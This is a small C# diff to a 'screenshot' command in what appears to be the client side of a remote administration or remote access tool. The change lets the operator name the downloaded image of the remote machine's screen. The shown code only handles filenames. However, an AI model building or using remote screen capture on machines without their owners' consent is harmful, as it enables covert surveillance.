@@ -12,20 +12,24 @@ namespace Client.Commands
 
         public string description { get; } = "Take a screenshot of the server's screen and downnload it";
 
-        public string syntaxHelper { get; } = "screenshot";
-
         public bool isLocal { get; } = false;
 
-        public List<string> validArguments { get; } = null;
+        public List<string> validArguments { get; } = new List<string>()
+        {
+            "",
+            "?*:[filename.png]"
+        };
 
 
         public void Process(List<string> args)
         {
             ColorTools.WriteCommandMessage("Waiting for screenshot data...");
-            var fileName = DateTime.Now.ToShortDateString().Replace('/', '-')
-                           + "_"
-                           + DateTime.Now.Hour + '-' + DateTime.Now.Minute + '-' + DateTime.Now.Second
-                           + ".png";
+            var fileName = args.Count == 1 ? args[0] :
+                                             DateTime.Now.ToShortDateString().Replace('/', '-')
+                                             + "_" + DateTime.Now.Hour
+                                             + '-' + DateTime.Now.Minute
+                                             + '-' + DateTime.Now.Second
+                                             + ".png";
             
             try
             {
